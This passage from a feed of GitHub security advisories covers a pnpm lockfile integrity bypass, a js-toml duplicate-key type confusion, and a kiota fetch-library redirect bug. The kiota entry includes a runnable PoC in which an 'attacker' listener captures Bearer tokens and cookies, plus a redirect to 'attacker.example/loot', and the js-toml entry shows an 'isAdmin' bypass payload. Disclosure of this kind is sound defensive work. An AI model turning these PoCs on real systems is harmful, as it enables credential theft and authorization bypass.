<p>In this situation, pnpm first detects that the downloaded tarball does not match the integrity stored in <code>pnpm-lock.yaml</code>. However, instead of failing by default, plain <code>pnpm install</code> performs a resolution repair, trusts the current remote registry metadata, updates the lockfile to the new integrity, and installs the new registry content.</p>
<p>In other words, when the lockfile and registry disagree, the default non-frozen behavior can end up trusting the remote registry over the content previously recorded in the lockfile.</p>
<p>This is especially relevant for:</p>
<ul>
<li>private registries that allow overwriting or republishing the same version</li>
<li>registry mirrors or proxies that can serve changed metadata and tarballs</li>
<li>compromised public or private registries</li>
<li>compromised registry proxy infrastructure</li>
</ul>
<p>The behavior is also surprising because the command reports an integrity error but still exits successfully after resolution repair.</p>
<p>This issue does not occur when <code>--frozen-lockfile</code> is enabled. In frozen mode, the same integrity mismatch fails the install and does not install the changed package content.</p>
<p>However, since the lockfile already records an integrity value, the integrity for the same package version should normally not change. If it does change, one likely explanation is that the server or registry has been compromised or is serving mutated package content. Under normal package publishing workflows, changed package content should be published as a new version instead of replacing an existing version.</p>
<p>For that reason, it may be safer for pnpm's default behavior to be closer to frozen mode for this specific case. At minimum, pnpm should not automatically repair the lockfile and trust the registry after an integrity mismatch. It should fail and let the user explicitly decide whether to discard the locked integrity, re-resolve the package from the remote registry, and update the lockfile.</p>
<h2 id="comparison">Comparison</h2>
<p>In the same scenario, <code>npm install</code> with an existing <code>package-lock.json</code> fails with <code>EINTEGRITY</code> and does not install the changed tarball.</p>
<p><code>pnpm install --frozen-lockfile</code> also fails as expected:</p>
<pre><code class="language-text">ERR_PNPM_TARBALL_INTEGRITY
</code></pre>
<p>The issue is specific to the default non-frozen behavior of plain <code>pnpm install</code> in non-CI environment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-54hh-g5mx-jqcp">https://github.com/pnpm/pnpm/security/advisories/GHSA-54hh-g5mx-jqcp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50573">https://nvd.nist.gov/vuln/detail/CVE-2026-50573</a></li>
<li><a href="https://github.com/advisories/GHSA-54hh-g5mx-jqcp">https://github.com/advisories/GHSA-54hh-g5mx-jqcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54hh-g5mx-jqcp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:52:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[js-toml] js-toml has silent type confusion via falsy-primitive duplicate-key bypass]]></title>
        <id>https://github.com/advisories/GHSA-m34p-749j-x6m6</id>
        <link href="https://github.com/advisories/GHSA-m34p-749j-x6m6"/>
        <updated>2026-06-26T22:49:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>js-toml</code>'s interpreter checks whether a key already exists in a parser-built container with <code>if (object[key])</code> instead of <code>if (key in object)</code>. When the prior value is a falsy primitive — <code>false</code>, <code>0</code>, <code>0n</code>, <code>0.0</code>, <code>-0</code>, or <code>""</code> — the duplicate-key branch is skipped and the value is silently overwritten by a later sub-table, dotted-key sub-table, or array-of-tables sharing the same name. Per the TOML 1.0.0 spec ("Defining a key multiple times is invalid"; "You cannot define any key or table more than once"), this should be a parse error.</p>
<p>The result is <strong>structural type confusion of attacker-named keys</strong> in the value returned by <code>load()</code>. A boolean-typed <code>false</code> (or numeric <code>0</code>) becomes a truthy object. Host applications that gate behavior on <code>if (config.flag)</code>, <code>if (!user.banned)</code>, <code>if (config.allowDelete)</code>, or <code>if (config.publicMode)</code> will silently take the truthy branch.</p>
<p>This is <strong>distinct</strong> from <a href="https://github.com/sunnyadn/js-toml/security/advisories/GHSA-65fc-cr5f-v7r2">GHSA-65fc-cr5f-v7r2</a> (the 1.0.2 prototype-pollution fix). <code>Object.prototype</code> is <strong>not</strong> polluted. The <code>Object.create(null)</code> mitigation from 1.0.2 is intact; the bug here is in the duplicate-key state machine, not in container construction.</p>
<h3 id="details">Details</h3>
<p>Two truthy checks are wrong:</p>
<p><code>src/load/interpreter.ts:214</code> — <code>Interpreter.tryCreatingObject</code></p>
<pre><code class="language-js">if (object[key]) {            // falsy primitives slip through
    // duplicate-key logic
} else {
    object[key] = createSafeObject();   // silently overwrites the prior falsy value
    ...
}
</code></pre>
<p><code>src/load/interpreter.ts:278</code> — <code>Interpreter.getOrCreateArray</code></p>
<pre><code class="language-js">if (object[first] &amp;&amp; !Array.isArray(object[first])) {   // same flaw
    throw new DuplicateKeyError();
}
object[first] = object[first] || [];   // overwrites the prior falsy value
</code></pre>
<p>Both should use the <code>in</code> operator. Containers are created via <code>Object.create(null)</code>, so <code>in</code> is unambiguous (no inherited keys to worry about).</p>
<p>The bug is reachable through every parent-walking interpreter path:</p>
<ul>
<li><code>assignValue</code> — dotted keys in <code>key = value</code></li>
<li><code>createTable</code> — <code>[stdTable]</code> headers</li>
<li><code>getOrCreateArray</code> — <code>[[arrayOfTables]]</code> headers</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-toml">isAdmin = false
[isAdmin]
forced = "yes"
</code></pre>
<pre><code class="language-js">import { load } from 'js-toml';

const config = load(`
isAdmin = false
[isAdmin]
forced = "yes"
`);

console.log(JSON.stringify(config));
// {"isAdmin":{"forced":"yes"}}

console.log(config.isAdmin ? 'BYPASS' : 'safe');
// BYPASS

if (config.isAdmin) {
  // attacker reaches admin-only code
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Spec-violating input acceptance leading to structural type confusion. (CWE-697)</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>in <code>src/load/interpreter.ts</code></p>
<pre><code class="language-diff">export class Interpreter extends BaseCstVisitor {
     ignoreImplicitDeclared,
     ignoreExplicitDeclared
   ) {
-    if (object[key]) {
+    if (key in object) {
       if (
         !isPlainObject(object[key]) ||
         (!ignoreExplicitDeclared &amp;&amp;
</code></pre>
<pre><code class="language-diff">export class Interpreter extends BaseCstVisitor {
       return this.getOrCreateArray(keys, object[first], idx + 1);
     }

-    if (object[first] &amp;&amp; !Array.isArray(object[first])) {
+    if (first in object &amp;&amp; !Array.isArray(object[first])) {
       throw new DuplicateKeyError();
     }

     object[first] = object[first] || [];
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sunnyadn/js-toml/security/advisories/GHSA-m34p-749j-x6m6">https://github.com/sunnyadn/js-toml/security/advisories/GHSA-m34p-749j-x6m6</a></li>
<li><a href="https://github.com/advisories/GHSA-m34p-749j-x6m6">https://github.com/advisories/GHSA-m34p-749j-x6m6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m34p-749j-x6m6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:49:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@microsoft/kiota-http-fetchlibrary] @microsoft/kiota-http-fetchlibrary: Bearer token and Cookie leak across origin on redirect due to case-mismatched scrub in fetchRequestAdapter]]></title>
        <id>https://github.com/advisories/GHSA-396q-4vc8-28x9</id>
        <link href="https://github.com/advisories/GHSA-396q-4vc8-28x9"/>
        <updated>2026-06-26T22:23:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@microsoft/kiota-http-fetchlibrary</code>'s <code>RedirectHandler</code> is documented as stripping <code>Authorization</code> and <code>Cookie</code> from cross-origin redirect targets, but the default <code>scrubSensitiveHeaders</code> callback in <code>RedirectHandlerOptions</code> uses case-sensitive property deletion (<code>delete headers.Authorization</code>, <code>delete headers.Cookie</code>) on a headers object that <code>FetchRequestAdapter.getRequestFromRequestInformation</code> has already lower-cased. The delete therefore targets keys that do not exist, the scrub is a no-op, and any Bearer token or Cookie attached by a kiota-generated SDK is forwarded to an attacker-controlled host across a 30x redirect.</p>
<p>This is reachable in the default middleware chain (<code>MiddlewareFactory.getDefaultMiddlewares</code>) with no custom configuration, and applies to every kiota-generated TypeScript SDK that uses <code>BaseBearerTokenAuthenticationProvider</code> or any other authentication provider that sets the <code>Authorization</code> request header.</p>
<h3 id="affected-versions">Affected versions</h3>
<p><code>@microsoft/kiota-http-fetchlibrary</code> <code>&gt;= 1.0.0-preview.97</code> (the release that introduced the <code>defaultScrubSensitiveHeaders</code> callback, commit <code>74886cc4</code>, tagged 2026-02-27) up to and including <code>1.0.0-preview.101</code> (latest at filing). The bug was verified end-to-end against the version published on npm: <code>1.0.0-preview.100</code>.</p>
<p>The case-mismatch primitive (lowercasing in the request adapter) predates the scrub itself — <code>FetchRequestAdapter.getRequestFromRequestInformation</code> has lower-cased header keys via <code>toLocaleLowerCase()</code> since commit <code>d612bac2</code> (2022-12-09). When the scrub was added in 2026-02 it inherited the mismatch.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Bearer token leak across origin.</strong> When a kiota-generated SDK calls a server that the SDK trusts (Microsoft Graph, an internal API, any OAuth2 resource server) and that server returns an HTTP redirect to a different host, the <code>Authorization: Bearer &lt;token&gt;</code> header issued by the auth provider is sent in cleartext to the redirect target. The redirect target can be controlled by:<ul>
<li>An attacker who can corrupt or MITM a single 30x response from the legitimate host (downgrade-on-redirect amplifier).</li>
<li>An attacker who has temporarily compromised a low-trust endpoint of the upstream API and can issue 302 responses (e.g. a public profile-image URL on Graph that returns 302 to attacker-controlled storage).</li>
<li>An attacker who can persuade the kiota-using application to call an attacker-chosen base URL that returns 302 to the attacker (a confused-deputy SSRF-style abuse where the application proxies a user-supplied URL through a kiota-built client).</li>
</ul>
</li>
<li><strong>Session cookie leak across origin.</strong> If the application or generated SDK attaches a <code>Cookie</code> header, the same primitive forwards it to the redirect target.</li>
<li><strong>No user interaction required.</strong> The default middleware chain is in effect; the application does not need to opt in to the bug.</li>
</ul>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p>The two pieces that combine into the bug.</p>
<p><strong>1. Headers are lower-cased on the way out of the request adapter.</strong></p>
<p><a href="https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/fetchRequestAdapter.ts#L529-L532"><code>packages/http/fetch/src/fetchRequestAdapter.ts:529-532</code></a>:</p>
<pre><code class="language-ts">const headers: Record&lt;string, string&gt; | undefined = {};
requestInfo.headers?.forEach((_, key) =&gt; {
    headers[key.toString().toLocaleLowerCase()] = this.foldHeaderValue(requestInfo.headers.tryGetValue(key));
});
</code></pre>
<p>The headers object that flows into the middleware pipeline as <code>fetchRequestInit.headers</code> has every key lower-cased. So <code>Authorization</code> becomes <code>authorization</code>, <code>Cookie</code> becomes <code>cookie</code>.</p>
<p><strong>2. The default redirect scrub deletes case-sensitive property names.</strong></p>
<p><a href="https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts#L67-L82"><code>packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts:67-82</code></a>:</p>
<pre><code class="language-ts">private static readonly defaultScrubSensitiveHeaders: ScrubSensitiveHeaders = (headers: Record&lt;string, string&gt;, originalUrl: string, newUrl: string) =&gt; {
    if (!headers || !originalUrl || !newUrl) {
        return;
    }
    try {
        const originalUri = new URL(originalUrl);
        const newUri = new URL(newUrl);
        const isDifferentHostOrScheme = originalUri.host.toLowerCase() !== newUri.host.toLowerCase() || originalUri.protocol.toLowerCase() !== newUri.protocol.toLowerCase();
        if (isDifferentHostOrScheme) {
            delete headers.Authorization;
            delete headers.Cookie;
        }
    } catch {
        return;
    }
};
</code></pre>
<p><code>delete headers.Authorization</code> is sugar for <code>delete headers["Authorization"]</code>. JavaScript object property names are case-sensitive. The headers object's actual key is <code>"authorization"</code> (lower-case). The delete removes nothing.</p>
<p><strong>3. The redirect handler invokes the scrub on the lower-cased object.</strong></p>
<p><a href="https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/middlewares/redirectHandler.ts#L133-L136"><code>packages/http/fetch/src/middlewares/redirectHandler.ts:133-136</code></a>:</p>
<pre><code class="language-ts">if (fetchRequestInit.headers) {
    currentOptions.scrubSensitiveHeaders(fetchRequestInit.headers as Record&lt;string, string&gt;, url, newUrl);
}
</code></pre>
<p>The redirect handler then issues a new <code>fetch</code> with the unchanged <code>fetchRequestInit.headers</code> (still containing <code>authorization</code>) to <code>newUrl</code> (the attacker-controlled host).</p>
<h3 id="how-the-bearer-token-reaches-the-attacker-host">How the Bearer token reaches the attacker host</h3>
<ol>
<li>Application calls a kiota-generated SDK method.</li>
<li><code>FetchRequestAdapter.send</code> calls <code>authenticationProvider.authenticateRequest(requestInfo)</code>. <code>BaseBearerTokenAuthenticationProvider</code> adds <code>Authorization: Bearer &lt;token&gt;</code> to <code>requestInfo.headers</code> (<a href="https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/abstractions/src/authentication/baseBearerTokenAuthenticationProvider.ts#L34"><code>packages/abstractions/src/authentication/baseBearerTokenAuthenticationProvider.ts:34</code></a>).</li>
<li><code>FetchRequestAdapter.getRequestFromRequestInformation</code> builds the <code>RequestInit</code> object, lower-casing every header key. The output <code>headers</code> map contains key <code>"authorization"</code>.</li>
<li>The default middleware chain runs <code>RetryHandler</code> then <code>RedirectHandler</code>. <code>RedirectHandler.execute</code> sets <code>redirect = "manual"</code> so the underlying <code>fetch</code> does not auto-follow.</li>
<li>The upstream HTTP request goes out to the victim host carrying <code>authorization: Bearer &lt;token&gt;</code>.</li>
<li>The victim host responds with <code>302 Location: https://attacker.example/loot</code>.</li>
<li><code>RedirectHandler.executeWithRedirect</code> sees the 302, parses the Location, computes <code>newUrl</code>, and calls <code>currentOptions.scrubSensitiveHeaders(headers, url, newUrl)</code>.</li>
<li><code>defaultScrubSensitiveHeaders</code> correctly observes <code>originalUri.host !== newUri.host</code>, enters the <code>if (isDifferentHostOrScheme)</code> branch, and runs <code>delete headers.Authorization</code>. The headers object's key is <code>authorization</code>. The delete is a no-op.</li>
<li><code>executeWithRedirect</code> recurses with <code>url = newUrl</code> and the unchanged <code>headers</code>. A second <code>fetch</code> goes out to the attacker host carrying <code>authorization: Bearer &lt;token&gt;</code> and <code>cookie: &lt;session&gt;</code>.</li>
</ol>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>End-to-end PoC against <code>@microsoft/kiota-http-fetchlibrary@1.0.0-preview.100</code> and <code>@microsoft/kiota-abstractions@1.0.0-preview.99</code> installed from npm with <code>npm install</code>. Two local HTTP listeners simulate the victim host (port 7771) and the attacker host (port 7772). The attacker listener captures the full set of request headers it observes.</p>
<p><code>package.json</code>:</p>
<pre><code class="language-json">{
  "name": "kiota-bearer-leak-poc",
  "version": "0.0.1",
  "private": true,
  "type": "module",
  "dependencies": {
    "@microsoft/kiota-abstractions": "^1.0.0-preview.99",
    "@microsoft/kiota-http-fetchlibrary": "^1.0.0-preview.99"
  }
}
</code></pre>
<p><code>poc.mjs</code>:</p>
<pre><code class="language-js">import http from "node:http";
import {
  BaseBearerTokenAuthenticationProvider,
  RequestInformation,
  HttpMethod,
} from "@microsoft/kiota-abstractions";
import {
  FetchRequestAdapter,
  KiotaClientFactory,
} from "@microsoft/kiota-http-fetchlibrary";

const TOKEN = "SECRET_TOKEN_AAAA-BBBB-CCCC-DDDD";
const COOKIE = "session=SECRET_COOKIE_EEEE-FFFF";

const attackerCapture = [];
const attackerServer = http.createServer((req, res) =&gt; {
  attackerCapture.push({ url: req.url, headers: req.headers });
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ pwned: true }));
});
await new Promise((r) =&gt; attackerServer.listen(7772, "127.0.0.1", r));

const victimServer = http.createServer((req, res) =&gt; {
  res.writeHead(302, { Location: "http://127.0.0.1:7772/api/data" });
  res.end();
});
await new Promise((r) =&gt; victimServer.listen(7771, "127.0.0.1", r));

class StaticTokenProvider {
  getAuthorizationToken() { return Promise.resolve(TOKEN); }
  getAllowedHostsValidator() { return { getAllowedHosts: () =&gt; [] }; }
}
const authProvider = new BaseBearerTokenAuthenticationProvider(new StaticTokenProvider());
const adapter = new FetchRequestAdapter(authProvider, undefined, undefined, KiotaClientFactory.create());
adapter.baseUrl = "http://127.0.0.1:7771";

const requestInfo = new RequestInformation();
requestInfo.urlTemplate = "{+baseurl}/me";
requestInfo.pathParameters["baseurl"] = "http://127.0.0.1:7771";
requestInfo.httpMethod = HttpMethod.GET;
requestInfo.headers.add("Cookie", COOKIE);

try { await adapter.sendNoResponseContent(requestInfo, undefined); } catch (e) {}

console.log("attacker received:", JSON.stringify(attackerCapture[0]?.headers, null, 2));
attackerServer.close();
victimServer.close();
</code></pre>
<h3 id="end-to-end-reproduction-against-microsoftkiota-http-fetchlibrary100-preview100">End-to-end reproduction against <code>@microsoft/kiota-http-fetchlibrary@1.0.0-preview.100</code></h3>
<p>Setup:</p>
<pre><code class="language-bash">mkdir kiota-leak &amp;&amp; cd kiota-leak
cat &gt; package.json &lt;&lt;'EOF'
{
  "name": "kiota-bearer-leak-poc",
  "version": "0.0.1",
  "private": true,
  "type": "module",
  "dependencies": {
    "@microsoft/kiota-abstractions": "^1.0.0-preview.99",
    "@microsoft/kiota-http-fetchlibrary": "^1.0.0-preview.99"
  }
}
EOF
# Save the poc.mjs above into the same directory
npm install
node --version  # tested on Node v26.0.0
node poc.mjs
</code></pre>
<p>Captured transcript (verbatim from a clean run on Node v26):</p>
<pre><code>attacker received: {
  "host": "127.0.0.1:7772",
  "connection": "keep-alive",
  "cookie": "session=SECRET_COOKIE_EEEE-FFFF",
  "authorization": "Bearer SECRET_TOKEN_AAAA-BBBB-CCCC-DDDD",
  "user-agent": "kiota-typescript/1.0.0-preview.24",
  "accept": "*/*",
  "accept-language": "*",
  "sec-fetch-mode": "cors",
  "accept-encoding": "gzip, deflate"
}
</code></pre>
<p>The attacker-controlled host on <code>127.0.0.1:7772</code> (a different origin from <code>127.0.0.1:7771</code>) observes both the OAuth2 Bearer token and the session cookie. The default <code>RedirectHandler.scrubSensitiveHeaders</code> did execute its delete branch (verified by inserting a <code>console.log</code> inside the scrub) but the deletes targeted property names that did not exist, leaving the lower-cased headers intact.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Two-line change to <code>defaultScrubSensitiveHeaders</code> to drop sensitive headers regardless of key case, with <code>Proxy-Authorization</code> covered for the Node-with-agent case.</p>
<pre><code class="language-diff">--- a/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts
+++ b/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts
@@ -73,12 +73,21 @@ export class RedirectHandlerOptions implements RequestOption {
         try {
             const originalUri = new URL(originalUrl);
             const newUri = new URL(newUrl);

-            // Remove Authorization and Cookie headers if the request's scheme or host changes
+            // Remove Authorization, Cookie, and Proxy-Authorization headers if the request's scheme or host changes.
+            // Header keys must be matched case-insensitively because the request adapter lower-cases
+            // header keys before they reach this middleware (see FetchRequestAdapter.getRequestFromRequestInformation).
             const isDifferentHostOrScheme = originalUri.host.toLowerCase() !== newUri.host.toLowerCase() || originalUri.protocol.toLowerCase() !== newUri.protocol.toLowerCase();

             if (isDifferentHostOrScheme) {
-                delete headers.Authorization;
-                delete headers.Cookie;
+                for (const key of Object.keys(headers)) {
+                    const lower = key.toLowerCase();
+                    if (lower === "authorization" || lower === "cookie" || lower === "proxy-authorization") {
+                        delete headers[key];
+                    }
+                }
             }
         } catch {
             // If URL parsing fails, don't modify headers
</code></pre>
<p>Tests should be extended in <code>packages/http/fetch/test/node/RedirectHandler.ts</code> to cover the realistic case where headers arrive lower-cased — the existing tests use PascalCase <code>Authorization: ...</code> fixtures that match the buggy delete by coincidence and therefore pass even with the no-op scrub. Add at minimum:</p>
<pre><code class="language-ts">it("Should drop authorization and cookie regardless of key case", async () =&gt; {
    const fetchRequestInit = {
        method: "GET",
        headers: { authorization: "Bearer TEST", cookie: "session=SECRET" },
    };
    const options = new RedirectHandlerOptions();
    options.scrubSensitiveHeaders(
        fetchRequestInit.headers,
        "https://graph.microsoft.com/v1.0/me",
        "https://attacker.example/loot",
    );
    assert.isUndefined(fetchRequestInit.headers.authorization);
    assert.isUndefined(fetchRequestInit.headers.cookie);
});
</code></pre>
<h3 id="fix-commit">Fix commit</h3>
<p><a href="https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974">https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974</a></p>
<h3 id="credit">Credit</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota-typescript/security/advisories/GHSA-396q-4vc8-28x9">https://github.com/microsoft/kiota-typescript/security/advisories/GHSA-396q-4vc8-28x9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49336">https://nvd.nist.gov/vuln/detail/CVE-2026-49336</a></li>
<li><a href="https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974">https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974</a></li>
<li><a href="https://github.com/advisories/GHSA-396q-4vc8-28x9">https://github.com/advisories/GHSA-396q-4vc8-28x9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-396q-4vc8-28x9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:23:11.000Z</published>
    </entry>
</feed>